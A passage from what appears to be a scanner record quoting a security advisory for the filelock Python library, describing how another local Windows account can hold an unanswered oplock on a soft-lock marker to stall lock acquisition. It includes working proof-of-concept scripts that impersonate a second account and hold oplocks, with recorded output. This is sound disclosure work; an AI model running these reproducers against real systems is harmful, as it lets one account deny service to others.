synced worktree, with the fltester account present):\n  C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_vm.py fltester '\u003cpassword\u003e' C:\\\\tmp\\\\rev4F-oplock\n\n[1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.\n    WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the\n    DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;\n    [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.\n[2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the\n    marker through os.open, which waits for the acknowledgement, past timeout=1.\n\nA thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport ctypes\nimport os\nimport subprocess\nimport sys\nimport threading\nimport time\nfrom ctypes import wintypes\n\nfrom filelock import FileLock, SoftFileLock, Timeout\n\nuser, password, base = sys.argv[1], sys.argv[2], sys.argv[3]\nicacls = os.path.join(os.environ[\"SYSTEMROOT\"], \"System32\", \"icacls.exe\")\nos.makedirs(base, exist_ok=True)\nsubprocess.run([icacls, base, \"/grant\", f\"{user}:(OI)(CI)(M)\"], check=True, capture_output=True)\n\nadvapi32 = ctypes.WinDLL(\"advapi32\", use_last_error=True)\nkernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\nadvapi32.LogonUserW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.LPCWSTR,\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.POINTER(wintypes.HANDLE),\n]\nkernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\nkernel32.CreateFileW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    wintypes.HANDLE,\n]\n\n\nclass Overlapped(ctypes.Structure):\n    _fields_ = (\n        (\"Internal\", ctypes.c_void_p),\n        (\"InternalHigh\", ctypes.c_void_p),\n        (\"Offset\", wintypes.DWORD),\n        (\"OffsetHigh\", wintypes.DWORD),\n        (\"hEvent\", wintypes.HANDLE),\n    )\n\n\nkernel32.DeviceIoControl.argtypes = [\n    wintypes.HANDLE,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    ctypes.POINTER(Overlapped),\n]\nkernel32.CloseHandle.argtypes = [wintypes.HANDLE]\nkernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\n\nGENERIC_READ = 0x80000000\nSHARE_ALL = 0x7\nOPEN_EXISTING = 3\nFLAG_OVERLAPPED = 0x40000000\nINVALID_HANDLE = wintypes.HANDLE(-1).value\nFSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000\nERROR_IO_PENDING = 997\nhold = threading.Event()\nreal_unlink = os.unlink\n\n\ndef impersonate() -\u003e None:\n    token = wintypes.HANDLE()\n    if not advapi32.LogonUserW(user, \".\", password, 3, 0, ctypes.byref(token)):\n        raise ctypes.WinError(ctypes.get_last_error())\n    if not advapi32.ImpersonateLoggedOnUser(token):\n        raise ctypes.WinError(ctypes.get_last_error())\n\n\ndef request_level1(path: str) -\u003e tuple[int, Overlapped] | None:\n    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n    if handle == INVALID_HANDLE:\n        return None\n    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n    if (\n        not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))\n        and ctypes.get_last_error() == ERROR_IO_PENDING\n    ):\n        return handle, overlapped\n    kernel32.CloseHandle(handle)\n    kernel32.CloseHandle(overlapped.hEvent)\n    return None\n\n\ndef drop(granted: tuple[int, Overlapped]) -\u003e None:\n    handle, overlapped = granted\n    kernel32.CloseHandle(handle)\n    kernel32.WaitForSingleObject(overlapped.hEvent, 5000)\n    kernel32.CloseHandle(overlapped.hEvent)\n\n\ndef release_under_oplock_requests(label: str, lock_path: str, cycles: int) -\u003e bool:\n    stop = threading.Event()\n    granted_box: list[tuple[int, Overlapped]] = []\n\n    def spinner() -\u003e None:\n        impersonate()\n        while not stop.is_set():\n            if (granted := request_level1(lock_path)) is not None:\n                granted_box.append(granted)\n                hold.wait()\n                return\n\n    releasing = threading.Event()\n    release_durations: list[float] = []\n\n    def owner() -\u003e None:\n        # thread_local locks release only on the acquiring thread, so acquire and release stay on this one\n        for _ in range(cycles):\n            lock = FileLock(lock_path, is_singleton=False)\n            lock.acquire(timeout=5)\n            started = time.monotonic()\n            releasing.set()\n            lock.release()\n            releasing.clear()\n            release_durations.append(time.monotonic() - started)\n            if granted_box:\n                return\n\n    holder = threading.Thread(target=spinner, daemon=True)\n    holder.start()\n    owner_thread = threading.Thread(target=owner, daemon=True)\n    owner_thread.start()\n    owner_thread.join(60)\n    stalled = owner_thread.is_alive() and releasing.is_set()\n    stop.set()\n    longest = max(release_durations, default=0.0) * 1000\n    print(f\"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms\")\n    if stalled:\n        print(\"  release() still running after 60 s while the oplock holder has not answered the break\")\n        if granted_box:\n            drop(granted_box[0])\n        owner_thread.join(10)\n        print(f\"  release() returned after the holder closed its handle: {not owner_thread.is_alive()}\")\n    return stalled\n\n\nprint(\"[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window\")\nstalled_native = release_under_oplock_requests(\"natural\", os.path.join(base, \"native.lock\"), 500)\n\nprint(\"[1b] the same, with the window between the handle close and the unlink widened to 200 ms\")\n\n\ndef slow_unlink(path: str, *, dir_fd: int | None = None) -\u003e None:\n    time.sleep(0.2)\n    real_unlink(path, dir_fd=dir_fd)\n\n\nos.unlink = slow_unlink\nstalled_scheduled = release_under_oplock_requests(\"scheduled\", os.path.join(base, \"native-scheduled.lock\"), 20)\nos.unlink = real_unlink\n\nprint(\"[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\")\nmarker = os.path.join(base, \"soft.lock\")\nholder = SoftFileLock(marker, is_singleton=False)\nholder.acquire()\nholder_fd = holder._context.lock_file_fd  # noqa: SLF001\nos.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle\nimpersonate_done = threading.Event()\ngranted_soft: list[tuple[int, Overlapped]] = []\n\n\ndef take_soft_oplock() -\u003e None:\n    impersonate()\n    if (granted := request_level1(marker)) is not None:\n        granted_soft.append(granted)\n    impersonate_done.set()\n    hold.wait()\n\n\nthreading.Thread(target=take_soft_oplock, daemon=True).start()\nimpersonate_done.wait(5)\nprint(f\"  oplock granted: {bool(granted_soft)}\")\noutcome = [\"still running after 25 s\"]\n\n\ndef contend() -\u003e None:\n    started = time.monotonic()\n    try:\n        SoftFileLock(marker, is_singleton=False).acquire(timeout=1)\n        outcome[0] = f\"acquired after {time.monotonic() - started:.2f} s\"\n    except Timeout:\n        outcome[0] = f\"Timeout after {time.monotonic() - started:.2f} s\"\n    except OSError as error:\n        outcome[0] = f\"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}\"\n\n\ncontender = threading.Thread(target=contend, daemon=True)\ncontender.start()\ncontender.join(25)\nprint(f\"  contender: {outcome[0]}\")\nsoft_stalled = \"still running\" in outcome[0]\nif granted_soft:\n    drop(granted_soft[0])\n    contender.join(10)\n    print(f\"  after the holder closed: {outcome[0]}\")\nhold.set()\nprint(\"STALLS\" if stalled_native or stalled_scheduled or soft_stalled else \"BOUNDED\")\n```\n\nRecorded output of section `[2]`:\n\n```\n[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\n  oplock granted: True\n  contender: Timeout after 10.02 s\n  after the holder closed: Timeout after 10.02 s\n```\n\n**`oplock_semantics_vm.py`**\n\n```python\n\"\"\"\nWhich path operations wait for an unanswered oplock break on Windows 11 NTFS. Same account, one process.\n\nRun on the VM: C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_semantics_vm.py C:\\\\tmp\\\\rev4F-sem\n\"\"\"\n\nfrom __future__ import annotations\n\nimport ctypes\nimport os\nimport sys\nimport threading\nimport time\nfrom ctypes import wintypes\n\nbase = sys.argv[1]\nos.makedirs(base, exist_ok=True)\nkernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\nkernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\nkernel32.CreateFileW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    wintypes.HANDLE,\n]\n\n\nclass Overlapped(ctypes.Structure):\n    _fields_ = (\n        (\"Internal\", ctypes.c_void_p),\n        (\"InternalHigh\", ctypes.c_void_p),\n        (\"Offset\", wintypes.DWORD),\n        (\"OffsetHigh\", wintypes.DWORD),\n        (\"hEvent\", wintypes.HANDLE),\n    )\n\n\nkernel32.DeviceIoControl.argtypes = [\n    wintypes.HANDLE,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    ctypes.POINTER(Overlapped),\n]\nkernel32.CloseHandle.argtypes = [wintypes.HANDLE]\nkernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\nGENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000\nSHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000\nINVALID_HANDLE = wintypes.HANDLE(-1).value\nLEVELS = {\"level1\": 0x00090000, \"batch\": 0x00090008}\n\n\ndef take(path: str, level: str) -\u003e tuple[int, Overlapped]:\n    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n    pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))\n    assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()\n    return handle, overlapped\n\n\ndef drop(granted: tuple[int, Overlapped]) -\u003e None:\n    kernel32.CloseHandle(granted[0])\n    kernel32.WaitForSingleObject(granted[1].hEvent, 5000)\n    kernel32.CloseHandle(granted[1].hEvent)\n\n\ndef timed(label: str, operation) -\u003e None:  # noqa: ANN001\n    done = threading.Event()\n    result = [\"still running after 15 s\"]\n\n    def run() -\u003e None:\n        started = time.monotonic()\n        try:\n            operation()\n            result[0] = f\"returned after {(time.monotonic() - started) * 1000:.1f} ms\"\n        except OSError as error:\n            result[0] = f\"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}\"\n        done.set()\n\n    threading.Thread(target=run, daemon=True).start()\n    done.wait(15)\n    print(f\"  {label}: {result[0]}\")\n    return done\n\n\ndef open_read(path: str) -\u003e None:\n    os.close(os.open(path, os.O_RDONLY | os.O_BINARY))\n\n\ndef open_write(path: str) -\u003e None:\n    os.close(os.open(path, os.O_RDWR | os.O_BINARY))\n\n\ndef create_new(path: str) -\u003e None:\n    os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))\n\n\nfor level in LEVELS:\n    for label, operation, consumes in (\n        (\"os.open O_RDONLY\", open_read, False),\n        (\"os.open O_RDWR\", open_write, False),\n        (\"os.open O_CREAT|O_EXCL on the existing file\", create_new, False),\n        (\"os.utime by path\", lambda p: os.utime(p, None), False),\n        (\"os.rename\", lambda p: os.rename(p, p + \".moved\"), True),\n        (\"os.unlink\", os.unlink, True),\n    ):\n        path = os.path.join(base, f\"{level}-{label.replace(' ', '_').replace('|', '')}.lock\")\n        with open(path, \"w\", encoding=\"utf-8\") as handle:\n            handle.write(\"1\\nhost\\n\")\n        granted = take(path, level)\n        print(f\"{level}, {label}\")\n        done = timed(label, lambda p=path, op=operation: op(p))\n        drop(granted)\n        done.wait(5)\n        print(f\"    after the holder closed: {'done' if done.is_set() else 'still running'}\")\n```\n\nThe review kept this probe's result as a sentence rather than its printed lines: under a same-account Level 1 or batch oplock, `os.open(path, os.O_RDONLY)`, `os.rename` and `os.unlink` were still running after 15 s and returned only once the holder closed its handle; `os.utime` by path and a failed `O_CREAT | O_EXCL` create returned at once.\n\n## Failure sequence\n\n```mermaid\nsequenceDiagram\n    participant A as other local account\n    participant M as soft.lock marker, no handle open\n    participant L as lock user: SoftFileLock(path).acquire(timeout=1)\n    participant W as Windows (NTFS)\n    A-\u003e\u003eW: CreateFileW(soft.lock, GENERIC_READ, share read/write/delete, FILE_FLAG_OVERLAPPED)\n    A-\u003e\u003eW: DeviceIoControl(FSCTL_REQUEST_OPLOCK_LEVEL_1), granted, break never acknowledged\n    L-\u003e\u003eW: os.open(soft.lock, O_CREAT|O_EXCL) fails with EEXIST at once\n    L-\u003e\u003eW: os.lstat(soft.lock) regular file\n    rect rgb(255, 214, 214)\n        L-\u003e\u003eW: os.open(soft.lock, O_RDONLY) inside _read_lock_file\n        Note over L,W: CreateFileW asks A to break the oplock and waits#59; the 1 s deadline, blocking=False and cancel_check are not consulted\n        W--\u003e\u003eL: handle after 10.02 s (two-account run), or when A closes (same-account probe)\n    end\n    L-\u003e\u003eL: _check_give_up: past the deadline, raise Timeout after 10.02 s\n    Note over A,M: a stale marker takes the same wait in Path.rename and Path.unlink, so it is not broken\n```\n\n## Evidence\n\nSection `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.\n\n## Impact\n\nEach `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.\n\n## Workarounds\n\n- Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls \u003cdir\u003e /inheritance:r /grant:r \"\u003cowner\u003e:(OI)(CI)F\" \"SYSTEM:(OI)(CI)F\" \"Administrators:(OI)(CI)F\"`). `mode` does not do this on Windows.\n- Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.\n- No `timeout`, `blocking` or `cancel_check` value bounds the wait.\n\n## Patched version\n\n4.2.1.\n\nFix: https://github.com/tox-dev/filelock/pull/835\n\n## Credits\n\nFound by the maintainers while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4).\n\n- 2026-10-15 23:08 UTC: report received (36 findings; this defect is not among them)\n- 2026-10-16 01:16 UTC: fix PR #835 opened, for the Linux lease finding of GHSA-7hmp-gf99-57hx\n- 2026-10-16 08:25 UTC: finding identified in the maintainers' review of PR #835\n- 2026-10-16 22:43 UTC: draft advisory created"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112907](https://osv.dev/CVE-2026-112907)**.\n\n## [GHSA-567q-5qvw-pf92](https://osv.dev/GHSA-567q-5qvw-pf92)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.\n\u003e \n\u003e Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.\n\u003e \n\u003e ## Severity\n\u003e \n\u003e **CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**\n\u003e \n\u003e `AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.\n\u003e \n\u003e Classification from the review: **security, conditional** on an unheld marker that another account can open.\n\u003e \n\u003e ## Scope and preconditions\n\u003e \n\u003e - Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.\n\u003e - Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.\n\u003e - Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.\n\u003e - Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.\n\u003e - What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.\n\u003e - Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.\n\u003e - Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e Scanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.\n\u003e \n\u003e ## Introduced\n\u003e \n\u003e [e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) \"feat(soft): detect and break stale locks\" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.\n\u003e \n\u003e A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.\n\u003e \n\u003e ## Reproduction\n\u003e \n\u003e The review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.\n\u003e \n\u003e **`oplock_vm.py`**\n\u003e \n\u003e ```python\n\u003e \"\"\"\n\u003e Windows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.\n\u003e \n\u003e Run on the VM (PowerShell, from the synced worktree, with the fltester account present):\n\u003e   C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_vm.py fltester '\u003cpassword\u003e' C:\\\\tmp\\\\rev4F-oplock\n\u003e \n\u003e [1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.\n\u003e     WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the\n\u003e     DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;\n\u003e     [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.\n\u003e [2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the\n\u003e     marker through os.open, which waits for the acknowledgement, past timeout=1.\n\u003e \n\u003e A thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.\n\u003e \"\"\"\n\u003e \n\u003e from __future__ import annotations\n\u003e \n\u003e import ctypes\n\u003e import os\n\u003e import subprocess\n\u003e import sys\n\u003e import threading\n\u003e import time\n\u003e from ctypes import wintypes\n\u003e \n\u003e from filelock import FileLock, SoftFileLock, Timeout\n\u003e \n\u003e user, password, base = sys.argv[1], sys.argv[2], sys.argv[3]\n\u003e icacls = os.path.join(os.environ[\"SYSTEMROOT\"], \"System32\", \"icacls.exe\")\n\u003e os.makedirs(base, exist_ok=True)\n\u003e subprocess.run([icacls, base, \"/grant\", f\"{user}:(OI)(CI)(M)\"], check=True, capture_output=True)\n\u003e \n\u003e advapi32 = ctypes.WinDLL(\"advapi32\", use_last_error=True)\n\u003e kernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\n\u003e advapi32.LogonUserW.argtypes = [\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.POINTER(wintypes.HANDLE),\n\u003e ]\n\u003e kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\n\u003e kernel32.CreateFileW.argtypes = [\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.HANDLE,\n\u003e ]\n\u003e \n\u003e \n\u003e class Overlapped(ctypes.Structure):\n\u003e     _fields_ = (\n\u003e         (\"Internal\", ctypes.c_void_p),\n\u003e         (\"InternalHigh\", ctypes.c_void_p),\n\u003e         (\"Offset\", wintypes.DWORD),\n\u003e         (\"OffsetHigh\", wintypes.DWORD),\n\u003e         (\"hEvent\", wintypes.HANDLE),\n\u003e     )\n\u003e \n\u003e \n\u003e kernel32.DeviceIoControl.argtypes = [\n\u003e     wintypes.HANDLE,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     ctypes.POINTER(Overlapped),\n\u003e ]\n\u003e kernel32.CloseHandle.argtypes = [wintypes.HANDLE]\n\u003e kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\n\u003e \n\u003e GENERIC_READ = 0x80000000\n\u003e SHARE_ALL = 0x7\n\u003e OPEN_EXISTING = 3\n\u003e FLAG_OVERLAPPED = 0x40000000\n\u003e INVALID_HANDLE = wintypes.HANDLE(-1).value\n\u003e FSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000\n\u003e ERROR_IO_PENDING = 997\n\u003e hold = threading.Event()\n\u003e real_unlink = os.unlink\n\u003e \n\u003e \n\u003e def impersonate() -\u003e None:\n\u003e     token = wintypes.HANDLE()\n\u003e     if not advapi32.LogonUserW(user, \".\", password, 3, 0, ctypes.byref(token)):\n\u003e         raise ctypes.WinError(ctypes.get_last_error())\n\u003e     if not advapi32.ImpersonateLoggedOnUser(token):\n\u003e         raise ctypes.WinError(ctypes.get_last_error())\n\u003e \n\u003e \n\u003e def request_level1(path: str) -\u003e tuple[int, Overlapped] | None:\n\u003e     handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n\u003e     if handle == INVALID_HANDLE:\n\u003e         return None\n\u003e     overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n\u003e     if (\n\u003e         not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))\n\u003e         and ctypes.get_last_error() == ERROR_IO_PENDING\n\u003e     ):\n\u003e         return handle, overlapped\n\u003e     kernel32.CloseHandle(handle)\n\u003e     kernel32.CloseHandle(overlapped.hEvent)\n\u003e     return None\n\u003e \n\u003e \n\u003e def drop(granted: tuple[int, Overlapped]) -\u003e None:\n\u003e     handle, overlapped = granted\n\u003e     kernel32.CloseHandle(handle)\n\u003e     kernel32.WaitForSingleObject(overlapped.hEvent, 5000)\n\u003e     kernel32.CloseHandle(overlapped.hEvent)\n\u003e \n\u003e \n\u003e def release_under_oplock_requests(label: str, lock_path: str, cycles: int) -\u003e bool:\n\u003e     stop = threading.Event()\n\u003e     granted_box: list[tuple[int, Overlapped]] = []\n\u003e \n\u003e     def spinner() -\u003e None:\n\u003e         impersonate()\n\u003e         while not stop.is_set():\n\u003e             if (granted := request_level1(lock_path)) is not 